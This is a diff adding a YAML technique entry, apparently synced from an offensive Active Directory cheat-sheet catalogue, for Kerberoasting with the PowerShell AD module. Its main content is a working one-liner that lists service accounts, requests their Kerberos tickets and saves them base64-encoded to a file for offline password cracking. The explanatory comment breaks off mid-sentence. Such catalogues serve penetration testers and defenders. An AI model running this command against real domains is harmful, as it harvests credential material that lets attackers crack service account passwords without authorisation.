@@ -1,0 +1,34 @@
+id: wadcoms/psadmodule-kerbaroasting
+type: technique
+platform: active-directory
+name: PSADmodule Kerbaroasting
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: domain-user
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: verify upstream LICENSE
+  upstream_version: a864cd1
+  last_synced: '2026-08-25'
+preconditions:
+- powershell
+commands:
+- template: 'Get-ADUser -Filter {ServicePrincipalName -ne "$null" -and Enabled -eq $true} -Properties
+    ServicePrincipalName | select -ExpandProperty ServicePrincipalName | % { $spn = $_; Add-Type -AssemblyName
+    System.IdentityModel; $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken
+    -ArgumentList $spn; $ticketBytes = $ticket.GetRequest(); $ticketBase64 = [System.Convert]::ToBase64String($ticketBytes);
+    $account = (Get-ADUser -Filter {ServicePrincipalName -eq $spn} -Properties SamAccountName).SamAccountName;
+    Write-Output "===== $account : $spn =====`n$ticketBase64" } | Out-File -FilePath "kerberos_tickets.txt"
+    -Encoding ASCII'
+  comment: Kerberoasting is the act of requesting service tickes for accounts that have an SPN set, and
+    then attempting to crack those hashes offline. This one liner using the powershell AD module serves
+    less as a feasiable attack and more as a PoC that the AD module with some ingenuity can
+references:
+- https://github.com/samratashok/ADModule
+tags:
+- active-directory
+- wadcoms
+- kerberos
